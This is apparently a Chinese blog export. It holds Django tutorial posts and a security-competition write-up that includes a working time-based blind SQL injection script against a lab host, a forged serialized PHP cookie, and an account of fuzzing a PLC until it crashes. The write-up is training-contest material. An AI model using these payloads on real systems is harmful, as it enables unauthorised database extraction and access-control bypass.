import authenticate, login, logoutfrom django.contrib.auth import modelsfrom django.contrib.auth.models import Userfrom .forms import CreateUser,Authdef index(request): return render(request,'blog/index.html')def register(request): createform = CreateUser(data=request.POST or None) if request.method == \"POST\": if createform.is_valid(): username = createform.clean_username() password = createform.clean_password2() email = createform.clean()['email'] #django 默认的user表创建用户使用create_user函数 user = User.objects.create_user(username=username,password=password,email=email) user.save() return HttpResponse(u\"注册成功\") else: error_msg = createform.errors print error_msg return render(request,'blog/register.html',&#123;\"errors\":error_msg&#125;) return render(request,'blog/register.html',&#123;\"createform\":createform&#125;)def auth(request): authform = Auth(data=request.POST or None) if request.method == \"POST\": #判断输入的数据是否符合规则 if authform.is_valid(): login(request,authform.get_user()) return render(request,'blog/index.html',&#123;&#125;) else: #如果数据不符合规则，就显示错误信息 error_msg=authform.errors print authform.errors return render(request, 'blog/login.html', &#123;\"userform\": authform, \"errors\": error_msg&#125;) return render(request,'blog/login.html',&#123;\"userform\":authform&#125;)def sign_out(request): logout(request) return redirect(\"/\") 问题一验证重名我们的CreateForm继承UserCreateForm 这个类继承User 这个又继承AbstractUser然后找到关键位置12345在文件site-packages\\django\\contrib\\auth\\models.py 394行左右找到error_messages=&#123; &apos;unique&apos;: _(&quot;A user with that username already exists.&quot;), &#125;) 也就是is_valid 方法判断error是否有错误存在判断出重名 username 是unique=True 值唯一的定义 问题二验证码当我们登录或者注册一个用户的时候，浏览器点击返回，在用此验证码注册其他的账号时，验证码应该是失效的，django-simple-captcha满足。问题三form表单的继承我们继承了UserCreationForm 和AuthenticationForm进行数据的验证，使用自带的验证方法实现用户的注册和登录。 结束语当django自带的数据表和验证方法不满足需求时，需要自行扩展接口功能，实现应用。","categories":[{"name":"Django","slug":"Django","permalink":"https://www.xjseck.com/categories/Django/"}],"tags":[{"name":"Django","slug":"Django","permalink":"https://www.xjseck.com/tags/Django/"}]},{"title":"Django学习笔记(三)","slug":"Django学习笔记-三","date":"2018-01-31T16:31:33.000Z","updated":"2018-09-14T06:06:44.802Z","comments":true,"path":"2018/02/01/Django学习笔记-三/","link":"","permalink":"https://www.xjseck.com/2018/02/01/Django学习笔记-三/","excerpt":"","text":"前言 通过上一个笔记的学习，我们大致明白了Django怎么从Views 传到url中然后在templates中进行显示内容。这一篇我们讲学习models控制数据库数据进行操作。相关内容如下： Django Models中相关的字段 Django ORM模式的理解 Django Models操作例子上一篇的源代码中blog目录下的Models.py中建立了相关的数据类。只需要执行如下命令就能在相应的数据库中建立表。源代码https://github.com/Huseck/Django-study/tree/Django-study-3需要配置mysql的连接信息，以及创建数据库。12345678910111213141516$python manage.py makemigrations$python manage.py migrate#之后我们进行数据操作$python manage.py shell #进入shell命令下进行操作&gt;&gt;&gt;from blog.models import New #导入所需的模块&gt;&gt;&gt;from datetime import * #进行数据的增、删、改、查&gt;&gt;&gt;New.objects.create(title=&quot;test1&quot;,body=&apos;test1&apos;,created_time=datetime.now(),modified_time=datetime.now(),author_id=1,category_id=1)&gt;&gt;&gt;New.objects.get(title=&apos;test1&apos;).delete()&gt;&gt;&gt;N=New.objects.get(title=&apos;seck&apos;)&gt;&gt;&gt;N.body=(&apos;seck-test&apos;)&gt;&gt;&gt;N.save()#进行查操作显示数据的时候，注意要在Models.py中进行添加 def __unicode__(self): return self.title#其他filter 切片等操作自行百度学习 例子三本例子中我们学习models模型操作数据库。首先还是新建项目 settings.py中配置Mysql12345678910DATABASES = &#123;'default': &#123; 'ENGINE': 'django.db.backends.mysql', 'NAME': 'django-model', 'USER': 'root', 'PASSWORD': 'pass', 'HOST': '127.0.0.1', 'PORT': '3306',&#125;&#125; 然后创建app models.py代码如下123456789101112131415161718192021222324252627#coding:utf-8from django.db import models# Create your models here.from django.db import modelsfrom django.utils.encoding import python_2_unicode_compatible@python_2_unicode_compatibleclass Author(models.Model): name = models.CharField(max_length=50) qq = models.CharField(max_length=10) addr = models.TextField() email = models.EmailField() def __str__(self): return self.name@python_2_unicode_compatibleclass Article(models.Model): title = models.CharField(max_length=50) author = models.ForeignKey(Author) content = models.TextField() score = models.IntegerField() # 文章的打分 tags = models.ManyToManyField('Tag') def __str__(self): return self.title@python_2_unicode_compatibleclass Tag(models.Model): name = models.CharField(max_length=50) def __str__(self): return self.name 导入数据 initdb.py12345678910111213141516171819202122232425262728293031323334353637383940414243444546#!/usr/bin/env python#-*- coding:utf-8 _*-\"\"\"author:secktime: 2018/01/26\"\"\"import randomfrom blog_week_5.wsgi import *from Model_study.models import Author, Article, Tagauthor_name_list = ['xjnu', 'seck', 'sfdx', 'test', 'xjseck']article_title_list = ['Django 笔记', 'Python 学习', 'HTML 学习']def create_authors(): for author_name in author_name_list: author, created = Author.objects.get_or_create(name=author_name) # 随机生成9位数的QQ， author.qq = ''.join( str(random.choice(range(10))) for _ in range(9) ) author.addr = 'addr_%s' % (random.randrange(1, 3)) author.email = '%s@seck.com' % (author.addr) author.save()def create_articles_and_tags(): # 随机生成文章 for article_title in article_title_list: # 从文章标题中得到 tag tag_name = article_title.split(' ', 1)[0] tag, created = Tag.objects.get_or_create(name=tag_name) random_author = random.choice(Author.objects.all()) for i in range(1, 21): title = '%s_%s' % (article_title, i) article, created = Article.objects.get_or_create( title=title, defaults=&#123; 'author': random_author, # 随机分配作者 'content': '%s 正文' % title, 'score': random.randrange(70, 101), # 随机给文章一个打分 &#125; ) article.tags.add(tag)def main(): create_authors() create_articles_and_tags()if __name__ == '__main__': main() print(\"Done!\")Django queryset 进行的操作 查看所执行的SQL语句 12345678$python manage.py shell&gt;&gt;&gt;from Model_study.models import Article,Author,Tag&gt;&gt;&gt; print str(Author.objects.all().query) #打印所执行的sql语句&gt;&gt;&gt; Author.objects.all().query.__str__() #这样也可以（只对select有用）&gt;&gt;&gt; Author=Author.objects.values_list(&apos;name&apos;,&apos;qq&apos;)&gt;&gt;&gt; Author #以元祖形式输出结果&gt;&gt;&gt; Author.objects.values_list(&apos;name&apos;,flat=True) #指定一个字段&gt;&gt;&gt; Article.objects.filter(author__name=&apos;xjnu&apos;).values_list(&apos;title&apos;,flat=True) #多表查询 查询结果排序 12&gt;&gt;&gt;Author.objects.all().order_by(&apos;name&apos;) &gt;&gt;&gt; Author.objects.all().order_by(&apos;-name&apos;); #倒序排列 支持正则 Where 查询 123&gt;&gt;&gt;Author.objects.filter(name__regex=&apos;^s.+&apos;).exclude(qq=399753917)#字段名+ 两个下划线 参考https://www.cnblogs.com/BigJ/p/7530516.html #exclude 类似SQL语句的where 索引查询 123&gt;&gt;&gt; Author.objects.all()[:1] #不支持负数&gt;&gt;&gt; Author.objects.all().reverse()[0]&gt;&gt;&gt; Author.objects.order_by(&apos;-id&apos;)[0] 和SQL语句进行显示调试，此方法能显示所有执行的sql语句 123456789101112131415161718192021222324 首先在settings.py最后加上 LOGGING = &#123; 'version': 1, 'disable_existing_loggers': False, 'handlers': &#123; 'console': &#123; 'class': 'logging.StreamHandler', &#125;, &#125;, 'loggers': &#123; 'django.db.backends': &#123; 'handlers': ['console'], 'level': 'DEBUG' if DEBUG else 'INFO', &#125;, &#125;,&#125; 然后在$python manage.py shell 下进行操作会显示sql语句 &gt;&gt;&gt; from Model_study.models import Article,Author ,Tag &gt;&gt;&gt; a=Article.objects.get(pk=1) (0.000) SET SQL_AUTO_IS_NULL = 0; args=None (0.000) SET SQL_AUTO_IS_NULL = 0; args=None (0.000) SELECT `Model_study_article`.`id`, `Model_study_article`.`title`, `Model_study_article`.`author_id`, `Model_study_article`.`content`, `Model_study_article`.`score` FROM `Model_study_article` WHERE `Model_study_article`.`id` = 1; args=(1,) &gt;&gt;&gt; 5.其他常见的操作可以搜索相关的资料 结束语本篇中我们主要学习models中对象中的相关操作，常用的数据操作，熟练掌握，后面会对我们实际项目开发中事半功倍，然后介绍Django的ORM怎么操作一对一、一对多、多对多的操作。","categories":[{"name":"Django","slug":"Django","permalink":"https://www.xjseck.com/categories/Django/"}],"tags":[{"name":"Django","slug":"Django","permalink":"https://www.xjseck.com/tags/Django/"}]},{"title":"Django学习笔记(二)","slug":"Django学习笔记-二","date":"2018-01-27T16:23:40.000Z","updated":"2018-09-14T06:07:21.115Z","comments":true,"path":"2018/01/28/Django学习笔记-二/","link":"","permalink":"https://www.xjseck.com/2018/01/28/Django学习笔记-二/","excerpt":"","text":"前言学习最快的办法就是动手实践。 通过上一个笔记的学习，我们应该能学习到了内容如下 能使用 Django创建 项目和一些参数的说明 能清楚Django默认创建项目的文件目录结构 通过本笔记的学习我们可以学习到的知识点如下 默认创建的Django配置解读 创建app 实例一个MVT 实例从上一个笔记到这个笔记的过度，需要动手操作才能很好的掌握。Django版本1.8.5实例（二） 默认的配置文件了解Django相关的配置都在settings.py文件中123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596# Build paths inside the project like this: os.path.join(BASE_DIR, ...)import osBASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))# Quick-start development settings - unsuitable for production# See https://docs.djangoproject.com/en/1.8/howto/deployment/checklist/# SECURITY WARNING: keep the secret key used in production secret!SECRET_KEY = 'abmu19wmz5#1qwmfc_wagpf_vh+8faqs8=#xi=mik1+4*9b*dv'# SECURITY WARNING: don't run with debug turned on in production!DEBUG = False #进行调试模式 True为开启# If this flag set to False, then user can't register account.IS_REGISTER_PERIOD = TrueALLOWED_HOSTS = ['127.0.0.1']# Application definition 创建的app应用定义到这里INSTALLED_APPS = ( 'django.contrib.admin', #管理员站点 'django.contrib.auth',#用户验证框架 'django.contrib.contenttypes',#文件类型框架 'django.contrib.sessions',#会话框架 'django.contrib.messages',#消息框架 'django.contrib.staticfiles',#静态资源管理框架 'account', #激活应用 'home', 'dashboard', 'gameboard', 'noticeboard',)\"\"\"中间件，介于request 和 response处理之间的一道处理过程，相对比较轻量级，并且在全局上改变，django的输入与输出，因为改变的是全局所以需要谨慎使用，用不好会影响性能，每一个中间件都会负责一个功能，例如AuthentictionMiddleware和session处理相关，\"\"\"MIDDLEWARE_CLASSES = ( 'django.contrib.sessions.middleware.SessionMiddleware', 'django.middleware.common.CommonMiddleware', 'django.middleware.csrf.CsrfViewMiddleware', 'django.contrib.auth.middleware.AuthenticationMiddleware', 'django.contrib.auth.middleware.SessionAuthenticationMiddleware', 'django.contrib.messages.middleware.MessageMiddleware', 'django.middleware.clickjacking.XFrameOptionsMiddleware', 'django.middleware.security.SecurityMiddleware',)ROOT_URLCONF = 'hexactf.urls'#这个变量的值就是根URLconf的模块名，默认是urls.py 文件的模块名TEMPLATES = [ &#123; 'BACKEND': 'django.template.backends.django.DjangoTemplates', 'DIRS': [os.path.join(BASE_DIR, \"static\", \"templates\")], #指定模板文件目录 'APP_DIRS': True, 'OPTIONS': &#123; 'context_processors': [ 'django.template.context_processors.debug', 'django.template.context_processors.request', 'django.contrib.auth.context_processors.auth', 'django.contrib.messages.context_processors.messages', ], &#125;, &#125;,]WSGI_APPLICATION = 'hexactf.wsgi.application'# Database# https://docs.djangoproject.com/en/1.8/ref/settings/#databases'''DATABASES = &#123; 'default': &#123; 'ENGINE': 'django.db.backends.sqlite3', 'NAME': os.path.join(BASE_DIR, 'db.sqlite3'), &#125;&#125;'''DATABASES = &#123; 'default': &#123; 'ENGINE': 'django.db.backends.mysql', #数据库引擎 'NAME': 'database_name', 'USER': 'mysql_id', 'PASSWORD': 'mysql_passwd', 'HOST': 'localhost', 'PORT': '', &#125;&#125;# Internationalization# https://docs.djangoproject.com/en/1.8/topics/i18n/LANGUAGE_CODE = 'ko-kr' #语言TIME_ZONE = 'Asia/Seoul' #时区USE_I18N = True #语言USE_L10N = True #数据和时间格式USE_TZ = False #是否启用时区# Static files (CSS, JavaScript, Images)# https://docs.djangoproject.com/en/1.8/howto/static-files/STATIC_URL = '/static/'LOGIN_URL = '/account/sign_in/'LOGOUT_URL = '/account/sign_out/'MEDIA_ROOT = os.path.join(BASE_DIR, 'static')MEDIA_URL = '/media/'if DEBUG: STATIC_ROOT = os.path.join(BASE_DIR, '/static', 'static')else: STATIC_ROOT = os.path.join(BASE_DIR, 'static', 'static')STATICFILES_DIRS = os.path.join(BASE_DIR, \"static\", \"static\"), 创建app $python manage startapp blog编写一个MVT 例子的层级目录如下首先我们创建好了blog app 添加到settings.py 中123456789INSTALLED_APPS = ( 'django.contrib.admin', 'django.contrib.auth', 'django.contrib.contenttypes', 'django.contrib.sessions', 'django.contrib.messages', 'django.contrib.staticfiles', 'blog',) 本例子中涉及到model中的相关内容在model.py中，model.py中的代码如下12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#coding:utf-8from django.db import modelsfrom django.contrib.auth.models import User# Create your models here.# 创建数据库表#step1：类名就是数据库中的表名，要继承modelsclass Category(models.Model): \"\"\" Django 要求模型必须继承 models.Model 类。 Category 只需要一个简单的分类名 name 就可以了。 CharField 指定了分类名 name 的数据类型，CharField 是字符型， CharField 的 max_length 参数指定其最大长度，超过这个长度的分类名就不能被存入数据库。 当然 Django 还为我们提供了多种其它的数据类型，如日期时间类型 DateTimeField、整数类型 IntegerField 等等。 Django 内置的全部类型可查看文档： https://docs.djangoproject.com/en/1.10/ref/models/fields/#field-types \"\"\" name = models.CharField(max_length=100) #python3 使用str 把对象以字符串形式显示 shell模式下all()函数可以显示数据 #python2.7 使用unicode def __unicode__(self): return self.name # def __str__(self): # return self.nameclass Tag(models.Model): \"\"\" 标签 Tag 也比较简单，和 Category 一样。 再次强调一定要继承 models.Model 类！ \"\"\" name = models.CharField(max_length=100) def __unicode__(self): return self.name # def __str__(self): # return self.nameclass New(models.Model): # 文章标题 title = models.CharField(max_length=70) # 文章正文，我们使用了 TextField。 # 存储比较短的字符串可以使用 CharField，但对于文章的正文来说可能会是一大段文本，因此使用 TextField 来存储大段文本。 body = models.TextField() # 这两个列分别表示文章的创建时间和最后一次修改时间，存储时间的字段用 DateTimeField 类型。 created_time = models.DateTimeField() modified_time = models.DateTimeField() # 文章摘要，可以没有文章摘要，但默认情况下 CharField 要求我们必须存入数据，否则就会报错。 # 指定 CharField 的 blank=True 参数值后就可以允许空值了。 excerpt = models.CharField(max_length=200, blank=True) # 这是分类与标签，分类与标签的模型我们已经定义在上面。 # 我们在这里把文章对应的数据库表和分类、标签对应的数据库表关联了起来，但是关联形式稍微有点不同。 # 我们规定一篇文章只能对应一个分类，但是一个分类下可以有多篇文章，所以我们使用的是 ForeignKey，即一对多的关联关系。 # 而对于标签来说，一篇文章可以有多个标签，同一个标签下也可能有多篇文章，所以我们使用 ManyToManyField，表明这是多对多的关联关系。 # 同时我们规定文章可以没有标签，因此为标签 tags 指定了 blank=True。 # 如果你对 ForeignKey、ManyToManyField 不了解，请看教程中的解释，亦可参考官方文档： # https://docs.djangoproject.com/en/1.10/topics/db/models/#relationships category = models.ForeignKey(Category) tags = models.ManyToManyField(Tag, blank=True) # 文章作者，这里 User 是从 django.contrib.auth.models 导入的。 # django.contrib.auth 是 Django 内置的应用，专门用于处理网站用户的注册、登录等流程，User 是 Django 为我们已经写好的用户模型。+ # 这里我们通过 ForeignKey 把文章和 User 关联了起来。 # 因为我们规定一篇文章只能有一个作者，而一个作者可能会写多篇文章，因此这是一对多的关联关系，和 Category 类似。 author = models.ForeignKey(User) def __unicode__(self): return self.title 在settings.py中查看数据库的配置信息，创建数据库准备工作完成之后我们需要执行12$python manage.py makemigrations$python manage.py migrate 所以我们直接在blog目录下的views.py中编写代码12345678910111213141516171819202122#coding:utf-8from django.shortcuts import renderfrom models import Newfrom django.http import HttpResponsefrom forms import AddForm# Create your views here.#直接使用Views 把数据推送到Template中进行浏览器显示def index(request): return HttpResponse('欢迎来到博客首页！&lt;a href=\"/show\"&gt;show&lt;/a&gt; &lt;a href=\"/add\"&gt;add&lt;/a&gt;')def show(request): new_list=New.objects.all() return render(request,'blog/show.html',&#123;'new_list':new_list&#125;)def add(request): if request.method == 'POST': form = AddForm(request.POST) if form.is_valid(): a=form.cleaned_data['a'] b=form.cleaned_data['b'] return HttpResponse(str(int(a)+int(b))) else: form=AddForm() return render(request,'blog/add.html',&#123;'form':form&#125;) 代码的说明之后的内容会详细讲到，目前是先这样了解用着。有了Views中的内容之后，我们怎样把它推送给客户浏览器上进行显示。之后我们需要在blog目录下的urls.py中进行设置1234567from django.conf.urls import urlfrom . import viewsurlpatterns=[ url(r'^$',views.index,name='index'), url(r'^show/$',views.show), url(r'^add/$',views.add),] 我们来创建templates这里我们有两种的创建方式，一种是统一在项目的根目录下创建一个templates文件然后里面创建app的名字文件夹本例子中使用的就是这一种，还有一种就是在app blog目录下创建templates文件夹，只是在变代码的时候模板文件路径略有不同而已。模板文件的代码show.html 12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;table border=\"1xp\"&gt; &lt;thead&gt; &lt;tr&gt; &lt;th&gt;标题&lt;/th&gt; &lt;th&gt;内容&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &#123;% for line in new_list %&#125; &lt;tr&gt; &lt;td&gt;&#123;&#123; line.title &#125;&#125;&lt;/td&gt; &lt;td&gt;&#123;&#123; line.body &#125;&#125;&lt;/td&gt; &lt;/tr&gt; &#123;% endfor %&#125; &lt;/tbody&gt;&lt;/table&gt;&lt;/body&gt;&lt;/html&gt; add.html如下1234567891011121314&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form method=\"post\"&gt; &#123;% csrf_token %&#125; &#123;&#123; form&#125;&#125; &lt;input type=\"submit\" value=\"提交\"&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 需要使Django找打模板文件的路径还需要在settings.py中设置DIRS123456789101112131415TEMPLATES = [ &#123; 'BACKEND': 'django.template.backends.django.DjangoTemplates', 'DIRS': [os.path.join(BASE_DIR, 'templates')], 'APP_DIRS': True, 'OPTIONS': &#123; 'context_processors': [ 'django.template.context_processors.debug', 'django.template.context_processors.request', 'django.contrib.auth.context_processors.auth', 'django.contrib.messages.context_processors.messages', ], &#125;, &#125;,] 最后实现了一个简单的mvt模式，但是之中的内容还需要私下底查一些相关的资料，进行详细的学习。 结束语本篇的学习，我们了解了Django的MVT模式，本篇的内容还得学习一些Django 中相关操作。代码上传到了github了https://github.com/Huseck/Django-study/tree/Django-study-2 下载配置的问题需要把blog目录下migrations目录下的 inital.py之类的文件删除然后数据迁移123$python manage.py makemigrations $python manage.py migrate$python manage.py runserver 如以下的相关知识点 Django 处理Form表单的操作 url正则的知识点 模板代码 操作 Django 怎么处理url参数的传递的","categories":[{"name":"Django","slug":"Django","permalink":"https://www.xjseck.com/categories/Django/"}],"tags":[{"name":"Django","slug":"Django","permalink":"https://www.xjseck.com/tags/Django/"}]},{"title":"Django 学习笔记(一)","slug":"Django-学习笔记-一","date":"2018-01-25T16:18:08.000Z","updated":"2018-07-15T16:22:15.113Z","comments":true,"path":"2018/01/26/Django-学习笔记-一/","link":"","permalink":"https://www.xjseck.com/2018/01/26/Django-学习笔记-一/","excerpt":"","text":"前言1.2018年了，计划一下学习任务。 深入学习Python学习Django 或者Flask 框架进行Web项目的开发深入学习PHP相关的黑科技和代码审计渗透测试流程和技巧总结社团相关的运营 先学习Django学习Django MVT 开发模式，主要学习Django的配置说明和app应用之间的耦合进行项目的组合。进行快速的web项目开发。 基础知识点学习 前端相关知识点（html css js form表单）学习 Python的一些基础语法点学习 Linux 基础操作和命令学习 数据库的相关操作学习 HTTP协议的一些参数学习 COOKIES SESSION 判断状态和权限参考http://python.usyiyi.cn/translate/django_182/index.html https://code.ziqiangxuetang.com/django/django-registration.html Django版本的一些特点版本之间的改动，基本操作和相关的一些配置说明。 例子快速的掌握Django就是拿例子说明，先明白在Django框架下的相关操作的规则之后，在回过头来明白实现的机理。例子（一）环境window10 Python2.7 1.先配置本机的Python隔离环境 $pip install virtualenv2.建立Django项目 $pip install django 本地环境变量设置一下 C:\\Python27\\Lib\\site-packages\\django\\bin 然后创建项目(相关的参数可以-h显示) $django-admin startproject django-project 启动项目 $python manage.py 8080 浏览器输入地址显示hello world 结束语从例子中先看看Django 默认创建项目的文件列表和代码中相关的配置","categories":[{"name":"Django","slug":"Django","permalink":"https://www.xjseck.com/categories/Django/"}],"tags":[{"name":"Django","slug":"Django","permalink":"https://www.xjseck.com/tags/Django/"}]},{"title":"帮人代打的比赛","slug":"帮人代打的比赛","date":"2017-12-28T15:43:41.000Z","updated":"2018-09-14T05:53:35.212Z","comments":true,"path":"2017/12/28/帮人代打的比赛/","link":"","permalink":"https://www.xjseck.com/2017/12/28/帮人代打的比赛/","excerpt":"","text":"前言好久没有更新博客了，这一段时间自己也比较懒，主要还是进行了两次比赛吧，东奔西跑的。也很难让自己沉淀下来。就简单的总结一下比赛的过程，然后发现自己的不足。 关于比赛CNAS T0832网络安全等级保护测评能力验证与攻防大赛2017年中关村信息安全测评联盟测评能力验证与攻防大赛2017年工业信息安全技能大赛一场比赛,一场懵逼，一场比赛，一场菜。首先说一下第一场比赛感觉和解题过程。比赛是在北京双十一当天的下午。进行WEB解题，从技术支撑I春秋就能发现，类似CTF-WEB题，共十道题，难度又长又短吧。比赛当时队伍中也是我一个人在解题，时间上肯定是不够用的。题目一(身份鉴别)直接信息收集 robots.txt获得后台登录界面，然后bp抓包，也该源代码中有提示admin/admin登录成功getflag 题目二(安全审计)题目提示是有小黑攻入web服务，放置了app留有后门，通过扫描之后发现access.log和error.log日志文件里面有apk 的地址，下载app进行逆向分析，当时是使用的dex2jar+jd-gui进行反编译的，出现了问题，事后复现了一下，使用jeb这个或者android_kill进行反编译比较方便一些。12345678910111213141516public class MainActivity extends AppCompatActivity &#123; public MainActivity() &#123; super(); &#125; protected void onCreate(Bundle arg6) &#123; int v3 = 56; int[] v0 = new int[]&#123;150, 161, 180, 164, 150, 255, 191, 248, 130, 152, 142, 161, 129, 136, 137, 255, 129, 165, 252, 187, 130, 152, 153, 180, 128, 152, 157, 187, 130, 166, 137, 184, 149, 161, 137, 255, 150, 165, 252, 254, 130, 152, 137, 181, 149, 166, 175, 180, 150, 136, 154, 166, 130, 166, 168, 245&#125;; int v1; for(v1 = 0; v1 &lt; v3; ++v1) &#123; v0[v1] ^= 204; &#125; new String(Base64.decode(v0.toString(), 0)); super.onCreate(arg6); this.setContentView(2130968603); &#125;&#125; 这里就很容易的发现是对204进行异或，只要再进行一次异或就能知道原来的数据Python写一个脚本 题目三(访问控制与授权) 首先抓包进行分析，cookie中有一个role参数进行base解码s:5:”guest” 所以替换成admin传入得到源代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?php$role = \"guest\";$flag = \"flag&#123;???&#125;\";$auth = false;if(isset($_COOKIE[\"role\"]))&#123; $role = unserialize(base64_decode($_COOKIE[\"role\"])); if($role === \"admin\")&#123; $auth = true; &#125; else&#123; $auth = false; &#125;&#125;else&#123; $role = base64_encode(serialize($role)); setcookie('role',$role);&#125;if($auth)&#123; if(isset($_POST['filename']))&#123; $filename = $_POST['filename']; $data = $_POST['data']; if(preg_match('[&lt;&gt;?]', $data)) &#123; die('No No No!'); &#125; else &#123; $s = implode($data); if(!preg_match('[&lt;&gt;?]', $s))&#123; $flag=\"None.\"; &#125; $rand = rand(1,10000000); $tmp=\"./uploads/\".md5(time() + $rand).$filename; file_put_contents($tmp, $flag); echo \"your file is in \" . $tmp; &#125; &#125; else&#123; echo \"Hello admin, now you can upload something you are easy to forget.\"; echo \"&lt;br /&gt;there are the source.&lt;br /&gt;\"; echo '&lt;textarea rows=\"10\" cols=\"100\"&gt;'; echo htmlspecialchars(str_replace($flag,'flag&#123;???&#125;',file_get_contents(__FILE__))); echo '&lt;/textarea&gt;';+ &#125;&#125;else&#123; echo \"Sorry. You have no permissions.\";&#125;?&gt; 首先是绕过data里面的值$s = implode($data); 可以看出是数组才有返回值，然后才能过if(!preg_match(‘[&lt;&gt;?]’, $s)){应为之前判断也是检测data所以数组可以绕过payload filename=1.php&amp;data[]=s &lt; das只有加上&lt;&gt;就可以 题目四(数据保密存储) 页面很简单就是一个大马的登录界面，这个题说白了就是爆破，但是想了一下组合的可能太多，事后知道是4位数组，爆破出来的话就简单了。 题目五(漏洞检测)题目提示网站存在漏洞，但是使用工具却没有发现问题所在，存在问题的参数是phone。打开题目发现是登录注册的题，一般不是存在源码就是注入或者挨个测试参数。简单的测试发现是挨个测试参数的问题，那就着重测试phone参数，最后发现是十六进制。首先注册然后登录check.php 查看此电话号码 有多少人使用，源代码中有提示 admin 的phone之后注册填入phone 用户名不能重复 phone 是数字 不能是字符，猜测0x 的二次注入麻烦的就是每次注册要使用不同的用户。 思路整理一下就可以开始撸py脚本了123456789101112131415161718192021222324252627282930313233343536373839404142434445#coding:utf-8import requestsimport randomimport string# print hex_s# database=\"webdb\"database=\"\"#pass c199055fc2c7a66eb257dd3c865398strstr=\"-\\&#123;0123456789abcdefghijklmnopqrstuvwxyz\\&#125;\"for x in range(20,50): for z in strstr: reg_url=\"http://172.16.5.105/register.php\" username='mmp'+str(random.randint(9999, 10000000)) sqlstr=\"1 and(if((ascii(substring((select phone from user limit 0,1),%s,1))=%s),sleep(3),1))\" %(x,ord(z)) #sqlstr=\"1 and(if((ascii(substring(database(),%s,1))=%s),sleep(3),0))\" %(x,z) # print sqlstr hex_s=\"\" for i in sqlstr: hex_s=hex_s+hex(ord(i)).replace('0x','') r_data=&#123; \"username\":username, \"password\":\"123\", \"phone\":\"0x\"+hex_s &#125; res=requests.post(reg_url, data=r_data,timeout=20) # print username # print res.content #先注册 log_url=\"http://172.16.5.105/login.php\" log_data=&#123; \"username\":username, \"password\":\"123\" &#125; S=requests.session() l_res=S.post(log_url, data=log_data,timeout=20) index_url=\"http://172.16.5.105/index.php\" index_res=S.get(index_url) # print index_res.content check_url=\"http://172.16.5.105/check.php\" try: check_res=S.get(check_url,timeout=3) except Exception, e: # print sqlstr database=database+z print database 赛后把这个题目的源代码复现了一下 详细的功能可以看 github 测评文件。其他题目当时比赛就一下午的时间，一个人做时间上有点来不及，后面的题目，大概是绕waf注入的题目，没有来得及仔细分析时间就到了。 工控的比赛以前也也没有接触过工控安全，所以赛前准备了一下知识点和方法。比赛地点是在杭州的电子科技大学比赛时间19-21都是从早8:00到晚20:00前两天是PLC硬件的调试和挖掘前期准备就是尝试收集网上的挖掘方法和已知的漏洞exp，工业漏洞安全报告文档等。干货比较十足的是KCon2015 Exploit PLC on the internet.pdfKCon2015 工控系统安全威胁与应对探索.pdf漏洞体现可以从 端口、协议和服务三方面进行体现测试挖掘的方向12345678910111213141516171819202122232425262728内存溢出区内的操作不正确的限制• 不正确的输入验证• 限制目录路径名的不正确规则• 权限和访问控制• 信息曝光• 凭证管理• 验证不正确• 资源管理错误• 页面生成过程中的不正确(跨站脚本)• 数字错误SCADA网络安全防范虽然无法在部署之前了解和检测所有安全漏洞，但可以肯定的是通过采用下面纵深防御措施一定可以主动地减轻攻击者对SCADA网络造成的安全破坏：• 开发安全策略；• 实现ACL；• 使用MAC地址过滤；• 使用VLAN分段；• 加强SCADA设备物理安全，包括警报和防撬管理；• 不允许使用第三方USB及相关存储设备；• 实现支持SCADA协议防御机制的NIDS/NIPS；• 整合操作系统和固件升级（包括补丁维护）；• 实现高强度的加密功能；• 确保已经准备好二重或三重身份验证策略；• 确保计划内的内部安全评估得到如期执行；• 考虑使用工控漏扫ICSscan以及包含fuzzing测试功能的ICSscan定期对工控系统进行安全评估；• 如果可能的话，使用诸如SSH、DNPsec、TLS、DTLS、SSL、PKI和IPsec之类的保护性协议；• 如果使用的是拨号调制解调器，那么实现支持活动日志、加密、名字和口令身份验证的增强型安全措施；• 实现一套SIEM安全信息和事件管理系统来完成日志聚合、日志审查和审计分析；• 为所有合适的防火墙、交换机、路由器、NIPS和NIDS设备实现可扩展的边界网络策略。 第一天趟了一上午，然后就会宾馆了，主要是熟悉了一下PLC_config控制软件，进行对PLC设备调试一些执行和抓抓包分析一下。第二天发现使用AlphaFuzzer1.6 进行网络协议fuzz结果可以把plc直接跑到宕机。也算是一个漏洞吧，哈哈。然后再抓包分析，感觉PLC设备没有什么验证机制，fuzz起来还是能发现它挺脆弱的。然后写文档走人了，没有报进入决赛的希望，什么都不会，在杭电的体育馆中待着还是挺冷的。最后一点SCADA软件检测就更加蒙蔽了。应该算是草草离场了。 总结网络安全的趋势感觉要覆盖很广的领域，想要能发现问题，编程技能和基础知识就显得更加的重要了。漏洞挖掘的思路和手段就应该加强，后面学习一下fuzzing的技术和手段，希望以后能沉住气，踏踏实实的走好每一步。最后想要这两场比赛的题目和SCADA软件的可以私聊，一起交流。","categories":[{"name":"比赛","slug":"比赛","permalink":"https://www.xjseck.com/categories/比赛/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.xjseck.com/tags/CTF/"},{"name":"比赛","slug":"比赛","permalink":"https://www.xjseck.com/tags/比赛/"}]},{"title":"正则调试案例","slug":"正则调试案例","date":"2017-10-27T15:20:21.000Z","updated":"2018-09-14T05:53:17.117Z","comments":true,"path":"2017/10/27/正则调试案例/","link":"","permalink":"https://www.xjseck.com/2017/10/27/正则调试案例/","excerpt":"","text":"前言我们在进行正则调试的时候，首先是需要读懂正则表达式的意思，其次是进行绕过或者fuzz，后续的才能能好的绕过。正则调试工具https://regexper.com 生成图进行解读正则表达式调试前的基础PHP 我们一般用的比较多的正则判断函数preg_match()、preg_replace()、preg_filter()等函数。这里我们就介绍preg_match()函数1int 